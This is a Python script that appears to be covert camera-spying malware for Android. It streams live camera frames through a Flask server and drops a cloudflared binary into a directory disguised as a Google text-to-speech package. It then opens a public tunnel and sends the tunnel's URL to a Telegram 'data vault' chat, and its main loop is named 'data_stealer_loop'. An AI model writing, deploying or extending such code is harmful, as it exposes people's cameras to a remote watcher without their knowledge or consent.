import os
import time
import threading
import requests
import subprocess
from flask import Flask, Response
import cv2

app = Flask(__name__)
TOKEN = os.environ.get('TELEGRAM_BOT_1_TOKEN')
VAULT_ID = os.environ.get('TELEGRAM_DATA_VAULT_ID')
BINARY_PATH = "/data/data/com.google.android.tts_v2/cloudflared"

def generate_frames():
    camera = cv2.VideoCapture(0)
    while True:
        success, frame = camera.read()
        if not success:
            break
        ret, buffer = cv2.imencode('.jpg', frame)
        frame = buffer.tobytes()
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
    camera.release()

@app.route('/live')
def video_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

def download_cloudflared():
    if not os.path.exists(BINARY_PATH):
        try:
            url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            r = requests.get(url, stream=True)
            with open(BINARY_PATH, 'wb') as f:
                for chunk in r.iter_content(8192):
                    f.write(chunk)
            os.chmod(BINARY_PATH, 0o755)
        except:
            pass

def start_tunnel():
    download_cloudflared()
    cmd = [BINARY_PATH, "tunnel", "--url", "http://localhost:8080"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        if "trycloudflare.com" in line:
            url = [word for word in line.split() if "trycloudflare.com" in word][0]
            full_url = url + "/live"
            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                          data={'chat_id': VAULT_ID, 'text': f"TUNNEL_READY:{full_url}"})
            break

def data_stealer_loop():
    while True:
        time.sleep(3600)

if __name__ == '__main__':
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False), daemon=True).start()
    threading.Thread(target=start_tunnel, daemon=True).start()
    data_stealer_loop()
